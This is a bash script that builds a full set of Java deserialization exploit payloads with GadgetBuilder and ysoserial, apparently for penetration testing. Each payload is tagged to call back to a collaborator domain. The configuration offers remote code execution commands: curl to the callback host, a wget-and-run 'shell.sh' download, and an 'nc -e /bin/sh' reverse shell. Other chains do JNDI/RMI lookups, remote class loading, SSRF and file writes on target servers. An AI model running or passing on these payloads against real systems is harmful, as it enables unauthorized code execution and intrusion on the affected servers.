#!/usr/bin/env bash
#
# Generate ALL gadget payloads from GadgetBuilder (chains1 + chains2) plus ysoserial extras.
# Every payload is tagged with a unique ID so callbacks are identifiable:
#   Clojure2 with ID 37 phones home to  37.<Collaborator>
# The ID -> chain mapping is written to callback-map.txt (next to payloads.inc).
#
# - GadgetBuilder v1.3.0 RELEASE jar ships only chains1 (56 chains).
# - Building the source adds chains2 (Clojure1-3, Jython1-2, Scala1-2); Clojure1/3 + Scala1 are
#   broken at runtime, so we generate the working ones: Clojure2, Jython1, Jython2, Scala2.
# - ysoserial v0.0.6 adds Jdk7u21, Myfaces2, Clojure, Jython1 (not in the GB release).
# Total: 64 payloads.
# Requires JDK 8 (GadgetBuilder uses internal JDK APIs). Runs in eclipse-temurin:8-jdk.
#
# ===== CONFIGURATION - edit these values =====
# Attacker callback domain. Any subdomain <ID>.<Collaborator> must resolve to your
# listener (wildcard DNS). Use your collaborator host or your own VPS domain.
Collaborator="hufzwo32omf8ss00d9dyayy18sej29qy.oastify.com"

# Command executed by RCE-capable chains (CommonsCollections*, Groovy*, BeanShell1,
# Clojure*, Jython*, MozillaRhino*, Jdk7u21, ...).
# Placeholders:  %C = <ID>.<Collaborator>   %P = Port   %N = bare ID
# Examples:
#   RCE_CMD="curl %C"
#   RCE_CMD="wget http://%C/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"
#   RCE_CMD="ping -c 1 %C"
#   RCE_CMD="nslookup %C"
#   RCE_CMD="nc %C %P -e /bin/sh"
#   RCE_CMD="/path/to/your/tool --beacon %C"
RCE_CMD="curl %C"

# Callback/TCP port used by LoadClass (C3P0*, Myfaces2), JNDI (Atomikos, SpringJta,
# WildFly1, XBean), JRMPClient and JRMPListener chains.
Port="8000"

# Output files (written to the current directory).
OUTFILE="payloads.inc"
MAPFILE="callback-map.txt"

# GadgetBuilder release version to download / build.
GB_VERSION="1.3.0"

FULL_JAR="gadgetbuilder-full-${GB_VERSION}.jar"
RELEASE_JAR="gadgetbuilder-${GB_VERSION}.jar"
YSO_JAR="ysoserial-all.jar"
YSO_VERSION="0.0.6"
GB_URL="https://github.com/software-engineering-and-security/gadgetbuilder/releases/download/${GB_VERSION}/${RELEASE_JAR}"
YSO_URL="https://github.com/frohoff/ysoserial/releases/download/v${YSO_VERSION}/${YSO_JAR}"

# Absolute directory of this script. Everything (jars, .work, output) stays here so the
# script runs from any CWD and never uses /tmp.
BASE="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" >/dev/null 2>&1 && pwd)"
WORK="$BASE/.work"

mkdir -p "$WORK"
cat > "$WORK/gadgetbuilder-all-gen.sh" <<'INNER'
#!/usr/bin/env bash
set -u

# Config is written by the outer script into /work/gb-config.sh and mounted read-only.
# All values below are defaults; the config file overrides them when present.
Collaborator="hufzwo32omf8ss00d9dyayy18sej29qy.oastify.com"
Port="8000"
OUTFILE="payloads.inc"
MAPFILE="callback-map.txt"
GB_VERSION="1.3.0"
RCE_CMD="curl %C"
if [ -s /work/gb-config.sh ]; then
  . /work/gb-config.sh
fi

# Jar locations (mounted read-only at /j in the container; the outer script ensures they exist).
FULL_JAR="/j/gadgetbuilder-full-${GB_VERSION}.jar"
RELEASE_JAR="/j/gadgetbuilder-${GB_VERSION}.jar"
YSO_JAR="/j/ysoserial-all.jar"

# The full fat jar (chains1 + chains2) is preferred, otherwise fall back to the release jar (chains1).
if [ -s "$FULL_JAR" ]; then
  GB_JAR="$FULL_JAR"
  GB_LABEL="GadgetBuilder full (chains1 + usable chains2)"
else
  GB_JAR="$RELEASE_JAR"
  GB_LABEL="GadgetBuilder release (chains1)"
fi

# Keep stderr quiet at shell level; gadget log lines are additionally filtered per chain.
exec 2>&-

clear
printf "\n\e[1;37m[#]\e[0m Generating ALL gadget payloads (JDK 8 required) \e[1;37m[#]\e[0m\n\n"
printf "Using: %s\n" "$GB_LABEL"
printf "Callback base: <ID>.%s   (ID is the left column of %s)\n" "$Collaborator" "$MAPFILE"
printf "Watch your collaborator/VPS logs for <ID>.%s hits.\n\n" "$Collaborator"

: > "$OUTFILE"
: > "$MAPFILE"
printf '%-2s  %-24s  %-22s  %s\n' "ID" "Chain" "Type" "Callback address" >> "$MAPFILE"

ID=0

gen() {
  local name="$1" arg="$2" jar="$3" note="$4" cb="$5" out host
  ID=$((ID+1))
  local id
  id=$(printf '%02d' "$ID")
  host="${id}.${Collaborator}"
  # %N = bare ID (file names), %B = ID base64 (file content), %C = id.collaborator,
  # %P = configured Port
  arg="${arg//%N/$id}"
  arg="${arg//%P/$Port}"
  if [ "$cb" != "-" ]; then
    cb="${cb//%N/$id}"
    cb="${cb//%P/$Port}"
    cb="${cb//%C/$host}"
    arg="${arg//%C/$host}"
  fi

  if [ "$jar" = ysoserial ]; then
    # ysoserial prints the binary serialized object; we base64 it. Last line only (avoids log noise).
    out=$(java -jar "$YSO_JAR" "$name" "$arg" 2>/dev/null | base64 -w0 2>/dev/null | tail -1)
  else
    # GadgetBuilder prints the base64 as the last stdout line; drop Reflections/INFO/trampoline lines.
    out=$(java -jar "$GB_JAR" -g "$name" -c "$arg" --b64 2>/dev/null \
          | grep -vE '^(Oct |INFO|Using default|WARNING|[[:space:]]*$)' | tail -1)
  fi

  printf '%-2s  %-24s  %-22s  %s\n' "$id" "$name" "$note" "$cb" >> "$MAPFILE"
  if [ -n "$out" ]; then
    printf '%s\n' "$out" >> "$OUTFILE"
    printf '  [+/] %s  %-24s -> %s chars\n' "$id" "$name" "${#out}"
  else
    printf '  [!!] %s  %-24s FAILED\n' "$id" "$name" >&2
  fi
}

# RCE chains: run the configured RCE_CMD (default curl <ID>.<collab>)
for c in \
  BeanShell1 Clojure4 Clojure5 CommonsCollections1 CommonsCollections5 \
  CommonsCollections6 CommonsCollections7 CommonsCollections9 Groovy1 Groovy2 \
  Jython3 Jython4 MozillaRhino3
do
  gen "$c" "$RCE_CMD" gb "RCE (${RCE_CMD})" "%C"
done

# Method.invoke chains
for c in \
  Ceylon Click1 CommonsBeanutils1 CommonsCollections2 CommonsCollections8 \
  Hibernate1 Hibernate2 JBossInterceptors1 JSON1 JavassistWeld1 MozillaRhino1 \
  MozillaRhino2 ROME ROME2 Spring1 Spring2 Struts2JasperReports Vaadin1 Vaadin2
do
  gen "$c" "$RCE_CMD" gb "Method.invoke (${RCE_CMD})" "%C"
done

# Constructor-invocation chains
for c in CommonsCollections10 CommonsCollections11 CommonsCollections3 CommonsCollections4; do
  gen "$c" "$RCE_CMD" gb "<init> (${RCE_CMD})" "%C"
done

# chains2 command-based extras
gen Clojure2 "$RCE_CMD" gb "ch2 RCE (${RCE_CMD})" "%C"
gen Jython2  "$RCE_CMD" gb "ch2 RCE (${RCE_CMD})" "%C"

# LoadClass: target loads a class from http://<id>.<collab>:<Port>
for c in C3P0 C3P0_2 C3P0_3; do
  gen "$c" "http://%C:${Port}:MyClass.class" gb "LoadClass :${Port}" "%C:${Port}"
done

# File write (<file>:<base64 content>) - writes %N_proof.txt on target, no callback
gen AspectJWeaver "%N_proof.txt:cHJvb2Y=" gb "FileWrite %N_proof.txt" "-"

# EL invocation (payload generated with an empty command)
gen MyFaces1 "" gb "EL invocation" "-"

# DNS lookup: querying <id>.<collab> is the callback
gen URLDNS              "%C" gb "DNS lookup" "%C"
gen SocketPermissionDNS "%C" gb "DNS lookup" "%C"

# SSRF: HTTP GET to <id>.<collab>
gen HTMLParser "http://%C" gb "SSRF (HTTP)" "%C"
gen JXPath     "http://%C" gb "SSRF (HTTP)" "%C"

# JRMP
gen JRMPListener "${Port}"        gb "listen :${Port} on target" "-"
gen JRMPClient   "%C:${Port}"     gb "connectback :${Port}" "%C:${Port}"

# JNDI lookup: rmi to <id>.<collab>:<Port> (watch TCP/DNS)
for c in Atomikos SpringJta WildFly1 XBean; do
  gen "$c" "rmi://%C:${Port}/service" gb "JNDI rmi :${Port}" "%C:${Port}"
done

# Random file write (<dir>:<base64 content>) - file content holds the ID base64
gen FileUpload1 "/tmp:%B" gb "RandomFileWrite /tmp" "-"
gen Wicket1     "/tmp:%B" gb "RandomFileWrite /tmp" "-"

# Zero-byte file creation
for c in JythonZeroFile Scala3; do
  gen "$c" "%N_proof.txt" gb "ZeroFile %N_proof.txt" "-"
done

# Set a system property
gen Scala4 "%Nprop:%Nval" gb "SetProperty" "-"

# chains2 PythonScript needs a local probe file; writes %N.py on target
printf 'probe' > proof.txt
gen Jython1 "proof.txt;%N.py" gb "PythonScript write %N.py" "-"

# chains2 SSRF
gen Scala2 "http://%C" gb "SSRF (HTTP)" "%C"

# ysoserial extras not present in the GadgetBuilder release (verified on JDK 8)
gen Jdk7u21 "$RCE_CMD" ysoserial "RCE (${RCE_CMD})" "%C"
gen Myfaces2 "http://%C:${Port}:Myfaces2" ysoserial "LoadClass :${Port}" "%C:${Port}"
gen Clojure  "$RCE_CMD" ysoserial "RCE (${RCE_CMD})" "%C"
gen Jython1  "/etc/hostname;%N_yso.py" ysoserial "write %N_yso.py on target" "-"

# Deduplicate in place, keeping the first (ID) order. Duplicates only occur for
# nondeterministic chains (AspectJWeaver, JRMPClient), and keeping ID order makes
# payloads.inc line N == ID N.
DEDUP_SEEN=""
if [ -s "$OUTFILE" ]; then
  awk '!seen[$0]++' "$OUTFILE" > "$OUTFILE.tmp"
  mv -f "$OUTFILE.tmp" "$OUTFILE"
fi
total=$(wc -l < "$OUTFILE" | tr -d ' ')
printf "\n\e[1;37m[+]\e[0m Generated %s unique base64 payloads in %s\n" "$total" "$OUTFILE"
printf "\e[1;37m[+]\e[0m ID -> chain mapping: %s\n" "$PWD/$MAPFILE"

INNER

# Write config for the inner script (mounted at /work/gb-config.sh and sourced there).
cat > "$WORK/gb-config.sh" <<EOF
Collaborator="${Collaborator}"
Port="${Port}"
OUTFILE="${OUTFILE}"
MAPFILE="${MAPFILE}"
GB_VERSION="${GB_VERSION}"
RCE_CMD="${RCE_CMD}"
EOF

mkdir -p "$BASE/jars"
PWD_jars="$BASE/jars"

# 1. ysoserial extras
if [ ! -s "$PWD_jars/$YSO_JAR" ]; then
  echo "[*] Downloading ysoserial v0.0.6 (extras)"
  ( cd "$BASE" && curl -LkfO "$YSO_URL" && mv -f "$YSO_JAR" "$PWD_jars/$YSO_JAR" )
fi

# 2. GadgetBuilder full jar (tries to build with chains2; falls back to release jar)
if [ ! -s "$PWD_jars/$FULL_JAR" ] && [ ! -s "$PWD_jars/$RELEASE_JAR" ]; then
  echo "[*] Downloading GadgetBuilder release v${GB_VERSION} (~150 MB)"
  ( cd "$BASE" && curl -LkfO "$GB_URL" && mv -f "$RELEASE_JAR" "$PWD_jars/$RELEASE_JAR" )
fi

if [ ! -s "$PWD_jars/$FULL_JAR" ]; then
  # The full jar (chains1 + chains2) is optional. By default we do NOT build from
  # source: download the release jar (chains1) and proceed. Set BUILD_CHAINS2=1 to
  # build the full jar, or drop a prebuilt gadgetbuilder-full-*.jar into jars/.
  if [ "${BUILD_CHAINS2:-0}" = "1" ]; then
    echo "[*] Building full jar from source (chains1 + chains2) ..."
    builddir="$WORK/build"
    ok=0
    if git clone --depth 1 --branch "$GB_VERSION" https://github.com/software-engineering-and-security/gadgetbuilder.git "$builddir/src" >/dev/null 2>&1; then
      # Build chains2 with Maven in Docker; keep a project-local Maven repo so nothing
      # depends on the container's home or /tmp.
      mkdir -p "$WORK/m2"
      docker run --rm         -v "$builddir/src:/src"         -v "$WORK/m2:/root/.m2"         -w /src         -e MAVEN_OPTS="-Dmaven.repo.local=/root/.m2/repository"         maven:3.8.6-eclipse-temurin-8         mvn -q -DskipTests -pl gadgetbuilder-chains2 -am package >"$WORK/maven.log" 2>&1 && ok=1
      if [ "$ok" != "1" ]; then
        echo "[-] Maven build failed; see .work/maven.log"
      fi
    else
      echo "[-] git clone failed"
    fi
    if [ "$ok" = 1 ]; then
      classes=$(find "$builddir/src/gadgetbuilder-chains2/target/classes" -name "*.class" 2>/dev/null)
      if [ -n "$classes" ]; then
        mkdir -p "$builddir/fat"
        cd "$builddir/fat"
        jar xf "$PWD_jars/$RELEASE_JAR"
        mkdir -p org/ses/gadgetbuilder/chains2
        cp $classes org/ses/gadgetbuilder/chains2/
        printf 'Manifest-Version: 1.0\nMain-Class: org.ses.gadgetbuilder.client.Main\n\n' > "$WORK/manifest.txt"
        jar cfm "$WORK/$FULL_JAR" "$WORK/manifest.txt" .
        mv -f "$WORK/$FULL_JAR" "$PWD_jars/$FULL_JAR"
        echo "[+] Full jar ready: jars/$FULL_JAR"
      else
        echo "[-] Source build produced no chains2 classes; using release jar (chains1 only)"
      fi
    else
      echo "[-] Source build failed; using release jar (chains1 only)"
    fi
    cd "$BASE"
  else
    echo "[*] Full jar not found; using release jar (chains1 only). Set BUILD_CHAINS2=1 to build chains2 from source."
  fi
fi

sudo docker run --rm \
  -v "$BASE:/work" \
  -w /work \
  -v "$BASE/jars:/j:ro" \
  -v "$BASE/.work/gadgetbuilder-all-gen.sh:/work/gadgetbuilder-all-gen.sh:ro" \
  -v "$BASE/.work/gb-config.sh:/work/gb-config.sh:ro" \
  eclipse-temurin:8-jdk \
  bash /work/gadgetbuilder-all-gen.sh
